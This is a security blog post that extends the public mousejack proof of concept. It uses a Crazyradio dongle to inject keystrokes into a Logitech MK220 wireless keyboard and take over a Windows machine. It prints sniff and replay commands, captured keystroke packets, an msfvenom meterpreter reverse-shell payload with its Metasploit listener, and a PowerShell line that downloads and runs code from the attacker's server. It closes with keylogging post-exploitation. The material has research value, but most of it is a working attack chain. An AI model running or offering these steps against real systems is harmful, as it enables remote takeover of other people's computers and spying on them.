          <p>Earlier this year researchers from <!-- raw HTML omitted --><strong>Bastille</strong><!-- raw HTML omitted --> discovered vulnerabilities in wireless mice and keyboards that could lead to them being remotely hijacked from as far as 225 meters away. They have a dedicated site detailing the vulnerabilities dubbed <!-- raw HTML omitted --><strong>mousejack</strong><!-- raw HTML omitted -->. They also released POC code which I have built on to implement a remote takeover of a machine using a wireless mouse/keyboard.</p>
<p>I already had in my possesion the Logitech Wireless Combo MK220 which consists of a K220 wireless keyboard and an M150 wireless mouse which I used as my test devices.</p>
<p>{% img /images/mk220.jpg %}</p>
<p>I used the <!-- raw HTML omitted --><strong>Crazyradio PA long range open USB radio dongle</strong><!-- raw HTML omitted --> as the attack device.
The original mousejack POC code is available on <!-- raw HTML omitted --><strong>Github</strong><!-- raw HTML omitted --> with instructions on how to flash the firmware necessary to perform the attack. I therefore set up both my machine and the Crazyradio PA dongle as described in their POC and tested the functionality they had provided.</p>
<p>{% img /images/CrazyRadioSide.jpg %}</p>
<p>I was then able to scan and sniff the packets transmitted by the mouse/keyboard using the <strong>nrf24-scanner.py</strong> and the <strong>nrf24-sniffer.py</strong> scripts. However, I was more interested in hijacking the mouse/keyboard and controlling the machine remotely. I therefore extended the POC to serve my purposes.</p>
<p>First, I modified the <strong>nrf24-sniffer.py</strong> code to log the sniiffed packets to a user specified output file.</p>
<p>###Sniff packets from address 8C:D3:0F:3E:B4 on all channels and save them to output.log
<code>./nrf24-sniffer.py --lna -a 8C:D3:0F:3E:B4 -o output.log</code></p>
<p>Next, I wrote a new python script <strong>nrf24-replay.py</strong> that would transmit packets read from a log file.
This would replay captured packets or transmit generated ones and follow the wireless USB dongle as it hopped through the channels.</p>
<p>###Send packets from the file keystroke.log to address 8C:D3:0F:3E:B4 on a hopping channel
<code>./nrf24-replay.py --lna -a 8C:D3:0F:3E:B4 -v -t 10 -i keystroke.log</code></p>
<p>With this in place I could now begin the hijack phase.
The first thing was to capture and study different key presses and interesting key combinations. From there I created mappings of the key presses to their corresponding packets. A sample of the digit mappings looks like this:</p>
<p><code>1	B4:D3:68:62:72:7D:CC:4B:C4:DD:F5:DE:EB:F3:00:00:00:00:00:00:00:57</code><br>
<code>2	00:D3:C1:1E:FE:28:B4:AB:8B:34:F5:DE:EB:F5:00:00:00:00:00:00:00:57</code><br>
<code>3	00:D3:8B:94:36:32:63:B0:7D:82:F5:DE:EB:F7:00:00:00:00:00:00:00:DF</code><br>
<code>4	00:D3:F6:E7:3C:36:52:67:28:1E:F5:DE:EB:F9:00:00:00:00:00:00:00:28</code><br>
<code>5	00:D3:46:06:1E:DB:58:93:57:03:F5:DE:EB:FB:00:00:00:00:00:00:00:EA</code><br>
<code>6	00:D3:BC:9B:18:BA:EE:93:6D:3C:F5:DE:EB:FD:00:00:00:00:00:00:00:1F</code><br>
<code>7	00:D3:47:7D:FC:44:55:5E:E4:78:F5:DE:EB:FF:00:00:00:00:00:00:00:5D</code><br>
<code>8	00:D3:BE:11:A7:CC:9D:75:7A:A5:F5:DE:EC:01:00:00:00:00:00:00:00:FA</code><br>
<code>9	00:D3:A1:E6:E7:E1:DC:6C:70:31:F5:DE:EC:03:00:00:00:00:00:00:00:33</code><br>
<code>0	00:D3:C5:01:FC:0A:F0:6C:B7:6D:F5:DE:EC:05:00:00:00:00:00:00:00:1D</code></p>
<p>I also did the same for useful key combinations such as ALT-F2, ALT-F4 and so on.<br>
I then wrote a python script called <strong>keymapper.py</strong> that would create a log file of packets of the corresponding key presses.</p>
<p>Now I could generate packets and save them to a log file and then wirelessly hijack the mouse/keyboard and perform various operations on the target machine.</p>
<p>Powershell is becoming one of the mot effective avenues of attacking a Windows machine. I therefore used the following aproach to accomplish the full hijack of a target machine:</p>
<ul>
<li>
<p>Generate and host a powershell payload on the attack server<br>
<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=ip lport=port -f psh-cmd -o update.ps1</code></p>
</li>
<li>
<p>Start a metasploit listener on our attack server<br>
<code>msfconsole</code><br>
<code>use exploit/multi/handler</code><br>
<code>set LHOST IP</code><br>
<code>set LPORT PORT</code><br>
<code>set PAYLOAD windows/meterpreter/reverse_tcp</code><br>
<code>exploit -j</code></p>
</li>
<li>
<p>Translate our powershell one liner to the corresponding packets using the keymapper.py script</p>
</li>
</ul>

</span></span><span style="display:flex;"><span>powershell <span style="color:#e6db74">&#34;iex (new-object net.webclient).downloadstring(&#39;http://IP/update.ps1&#39;)&#34;</span>
</span></span></code></pre></div><ul>
<li>
<p>Hijack the target&rsquo;s wireless mouse/keyboard and wait for their machine to connect back to the attack server
<code>./nrf24-replay.py --lna -a 8C:D3:0F:3E:B4 -i shell.log -t 10</code></p>
</li>
<li>
<p>Perform post exploitation on the target machine</p>
</li>
</ul>
<p>I have uploaded the POC code <!-- raw HTML omitted --><strong>here</strong><!-- raw HTML omitted --> on Github.</p>
<p>A POC video of the hijack described can be found below where I take over a Windows 7 machine and perform keylogging post-exploitation.</p>

<p>Further research on different wireless mice/keyboards is ongoing, more so on the packet composition and encryption.</p>
<p>Till next time, happy hacking!</p>
